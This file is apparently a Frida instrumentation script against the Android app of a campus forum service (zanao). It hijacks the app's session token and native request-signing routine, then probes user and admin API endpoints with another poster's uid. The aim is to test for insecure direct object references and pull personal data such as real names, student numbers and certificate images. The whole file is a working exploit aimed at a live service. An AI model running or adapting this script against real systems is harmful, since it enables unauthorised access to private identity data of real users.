// probe6.js — 列出帖子里非匿名作者(uid)，然后跑 IDOR 探测
var TOKEN = null, ALIAS = null, DEVICE = null;
function sign(f) {
    var T = Java.use('java.util.TreeMap'), I = Java.use('java.lang.Integer'), m = T.$new();
    for (var k in f) m.put(String(k), (typeof f[k] === 'number') ? I.valueOf(Math.round(f[k])) : String(f[k]));
    return Java.use('com.comingx.zanao.utils.JniUtils').makeSign(m);
}
function bytesOf(s) {
    var S = Java.use('java.lang.String'), bs = S.$new(s).getBytes('UTF-8'), a = [];
    for (var i = 0; i < bs.length; i++) a.push(bs[i]);
    return Java.array('byte', a);
}
function api(method, path, data) {
    var S = Java.use('java.lang.String'), HUC = Java.use('java.net.HttpURLConnection');
    var url = 'http://api.app.zanao.com' + path, q = [];
    for (var k in data) q.push(encodeURIComponent(k) + '=' + encodeURIComponent(data[k]));
    if (method === 'GET' && q.length) url += '?' + q.join('&');
    var c = Java.cast(Java.use('java.net.URL').$new(url).openConnection(), HUC);
    c.setRequestMethod(method); c.setConnectTimeout(15000); c.setReadTimeout(25000); c.setDoInput(true);
    var nd = '', td = String(Math.floor(Date.now() / 1000));
    for (var i = 0; i < 20; i++) nd += Math.floor(Math.random() * 10);
    var si = { timestamp__: td, randnum__: nd };
    for (var kk in data) si[kk] = data[kk];
    var h = {
        'X-Sc-Alias': ALIAS, 'X-Sc-Token': TOKEN, 'X-Sc-Client': 'app',
        'X-Sc-Device': DEVICE, 'X-Sc-Platform': 'Android', 'X-Sc-Hb-V': '210',
        'X-Sc-Nt-V': '310', 'X-Sc-Version': '3.1.0', 'X-Sc-Nd': nd, 'X-Sc-Td': td,
        'X-Sc-Ah': sign(si), 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'okhttp/4.9.3'
    };
    if (method === 'POST') { h['Content-Type'] = 'application/json; charset=utf-8'; c.setDoOutput(true); }
    for (var k2 in h) c.setRequestProperty(k2, String(h[k2]));
    if (method === 'POST') { var os = c.getOutputStream(); os.write(bytesOf(JSON.stringify(data))); os.flush(); os.close(); }
    var code = c.getResponseCode();
    var is = (code >= 400) ? c.getErrorStream() : c.getInputStream(), txt = '';
    if (is !== null) {
        var BAOS = Java.use('java.io.ByteArrayOutputStream'), buf = Java.array('byte', new Array(8192).fill(0)), b = BAOS.$new();
        while (true) { var n = is.read(buf); if (n <= 0) break; b.write(buf, 0, n); }
        is.close(); txt = String(S.$new(b.toByteArray(), 'UTF-8'));
    }
    var j = null; try { j = JSON.parse(txt); } catch (e) { }
    return { code: code, json: j, raw: j ? null : txt.substring(0, 300) };
}
function PII(o, out, d) {
    out = out || {}; d = d || 0;
    if (d > 6 || !o) return out;
    if (Array.isArray(o)) { for (var i = 0; i < Math.min(o.length, 2); i++) PII(o[i], out, d + 1); }
    else if (typeof o === 'object') {
        var K = ['uid', 'user_id', 'nickname', 'headimgurl', 'realname', 'student_no', 'cert_img',
                 'cert_img_url', 'cert_valid', 'reg_days', 'school_id', 'college_text', 'degree_text', 'errno', 'errmsg'];
        for (var k in o) {
            if (K.indexOf(k) >= 0 && typeof o[k] !== 'object') out[k] = String(o[k]).substring(0, 90);
            PII(o[k], out, d + 1);
        }
    }
    return out;
}
function run() {
    var out = [];
    var r1 = api('POST', '/thread/v2/list', { page: 1, per_page: 20 });
    var list = null;
    (function f(o) {
        if (!o || typeof o !== 'object' || list) return;
        if (Array.isArray(o) && o.length && o[0] && typeof o[0] === 'object' && (o[0].headimgurl || o[0].nickname)) { list = o; return; }
        for (var k in o) f(o[k]);
    })(r1.json);
    if (!list) { send({ t: 'results', list: [{ tag: 'no-list', raw: r1.raw }] }); return; }

    var rows = [], target = null;
    for (var i = 0; i < list.length; i++) {
        var it = list[i];
        rows.push({ tid: it.thread_id, anon: it.is_anon, uid: it.uid, nick: it.nickname });
        if (!target && !it.is_anon && it.uid) target = { uid: it.uid, tid: it.thread_id, nick: it.nickname };
    }
    out.push({ tag: 'rows', rows: rows.slice(0, 20), target: target });
    if (!target) { send({ t: 'results', list: out }); return; }

    function probe(tag, method, path, data) {
        var r = api(method, path, data);
        var o = { tag: tag, code: r.code, errno: r.json && r.json.errno, errmsg: r.json && r.json.errmsg,
                  fields: PII(r.json), raw: r.raw };
        out.push(o);
    }
    probe('POST /mx/user/usershow', 'POST', '/mx/user/usershow', { uid: target.uid });
    probe('POST /mx/admin/userinfo', 'POST', '/mx/admin/userinfo', { uid: target.uid });
    probe('POST /thread/admin/userinfo', 'POST', '/thread/admin/userinfo', { uid: target.uid });
    probe('POST /thread/admin/userthread', 'POST', '/thread/admin/userthread', { uid: target.uid });
    probe('POST /user/usershow', 'POST', '/user/usershow', { thread_id: target.tid });
    probe('GET /user/certinfo+uid', 'GET', '/user/certinfo', { school_id: '1', uid: target.uid });
    probe('POST /user/info', 'POST', '/user/info', { from: 'mine' });
    send({ t: 'results', list: out });
}
(function w(t) {
    if (typeof Java !== 'undefined') {
        Java.perform(function () {
            var N = Java.use('com.comingx.zanao.JSIs.NetworkJSI');
            ['request', 'easyRequest'].forEach(function (m) {
                if (!N[m]) return;
                N[m].overloads.forEach(function (ov) {
                    if (ov.argumentTypes.length !== 1 || ov.argumentTypes[0].className !== 'java.lang.String') return;
                    ov.implementation = function (s) {
                        try {
                            if (!TOKEN && s && s.indexOf('X-Sc-Token') >= 0) {
                                var p = JSON.parse(s), v = p.parameters[0].value;
                                TOKEN = v.header['X-Sc-Token']; ALIAS = v.header['X-Sc-Alias']; DEVICE = v.header['X-Sc-Device'];
                                setTimeout(function () { try { run(); } catch (e) { send({ t: 'run-err', m: '' + e }); } }, 2500);
                            }
                        } catch (e) { }
                        return ov.call(this, s);
                    };
                });
            });
        });
        return;
    }
    if (t <= 0) return;
    setTimeout(function () { w(t - 1); }, 200);
})(200);
